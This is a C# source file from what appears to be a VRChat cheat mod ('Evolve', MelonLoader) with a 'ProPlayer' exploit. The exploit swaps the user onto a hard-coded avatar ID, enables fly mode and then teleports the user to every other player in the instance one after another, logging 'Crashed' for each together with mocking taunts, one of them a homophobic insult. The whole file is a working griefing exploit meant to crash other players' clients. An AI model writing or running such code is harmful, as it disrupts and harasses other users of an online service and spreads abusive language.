using Evolve.ConsoleUtils;
using MelonLoader;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Evolve.Buttons;
using Evolve.Wrappers;
using Mono.CSharp;
using UnityEngine;
using VRC.Core;
using static Evolve.ConsoleUtils.EvoVrConsole;
using VRC;
using VRCSDK2;
using Evolve.Utils;

namespace Evolve.Exploits
{
    class ProPlayer
    {
        public static string PreviousAvatar;
        public static bool Teleportbool = false;
        public static bool rekt = false;
        public static int outplayed = 0;
        public static List<string> ohohoh = new List<string>()
        {
            "Weeee",
            "WhAt A pLayEr OmG!",
            "FaaakeeEeeEEer",
            "TuduUDUDudmMDdMMDututuutuuu",
            "Too bad for this player im just better ^",
            "Wenga goes brrrrr",
            "LMFAO YOU GAY",
            "Daddy ive been a bad person...",
            "rEEeEkT",
            "And wooops you crashed",
            "brrrrrrr",
            "OmgG WhAT a PlAY!!!!",
            "I love burgers",
            "BVrbrUBURu!!!",
            "Buy Evolve !", 
        };
        public static void Start()
        {
            rekt = false;
            Teleportbool = false;
            outplayed = 0;
            PreviousAvatar = VRCPlayer.field_Internal_Static_VRCPlayer_0.prop_ApiAvatar_0.id;
            var avatar_menu = GameObject.Find("Screens").transform.Find("Avatar").GetComponent<VRC.UI.PageAvatar>();
            {
                avatar_menu.field_Public_SimpleAvatarPedestal_0.field_Internal_ApiAvatar_0 = new ApiAvatar
                {
                    id = "avtr_86f96fce-9044-4933-90ec-fbfc6b402d8d"
                };

                avatar_menu.ChangeToSelectedAvatar();

                EvoVrConsole.Log(LogsType.Warn, "ε尺ψξρ尺.[̲̅?̲̅]..!");
                EvoVrConsole.Log(LogsType.Event, "what");
                EvoVrConsole.Log(LogsType.Voice, "have");
                EvoVrConsole.Log(LogsType.RPC, "you");
                EvoVrConsole.Log(LogsType.Ban, "done...");
                Teleportbool = true;
                rekt = true;
                MelonCoroutines.Start(WaitForAvatarToLoad());
                MelonCoroutines.Start(Teleport());
                IEnumerator WaitForAvatarToLoad()
                {
                    while (GameObject.Find("OOoooOHOohoWhwTAaPAlaYER") == null)
                        yield return null;
                    EvoVrConsole.Log(LogsType.Warn, "ε你你的乇的ｱ他尺ψξρ尺语乇");
                    Settings.ItemsOrbit = true;
                    MovementsMenu.Fly.setToggleState(true, true);
                    yield return new WaitForSeconds(67.5f);

                    avatar_menu.field_Public_SimpleAvatarPedestal_0.field_Internal_ApiAvatar_0 = new ApiAvatar
                    {
                        id = PreviousAvatar
                    };
                    avatar_menu.ChangeToSelectedAvatar();
                    MovementsMenu.Fly.setToggleState(false, true);
                    Teleportbool = false;
                    rekt = false;
                    Settings.ItemsOrbit = false;
                    Exploits.OwnerShip = false;
                }

                IEnumerator Teleport()
                {
                    while (GameObject.Find("OOoooOHOohoWhwTAaPAlaYER") == null)
                        yield return null;
                    yield return new WaitForSeconds(10f);
                    while (Teleportbool)
                    {
                        for (int i = 0; i < Wrappers.Utils.PlayerManager.AllPlayers().Count; i++)
                        {
                            var Player = Wrappers.Utils.PlayerManager.AllPlayers()[i];
                            if (Player.prop_APIUser_0.id != APIUser.CurrentUser.id)
                            {
                                if (outplayed == 13) outplayed = 0;
                                outplayed++;
                                EvoVrConsole.Log(LogsType.Warn, $"Crashed: {Player.DisplayName()} XD");
                                EvoVrConsole.Log(LogsType.Info, ohohoh[outplayed]);
                                VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position = Player.transform.position + new Vector3(0, 1, 0);
                                yield return new WaitForSeconds(0.2f);
                            }
                        }
                        yield return new WaitForEndOfFrame();
                    }
                }
            }
        }
    }
}
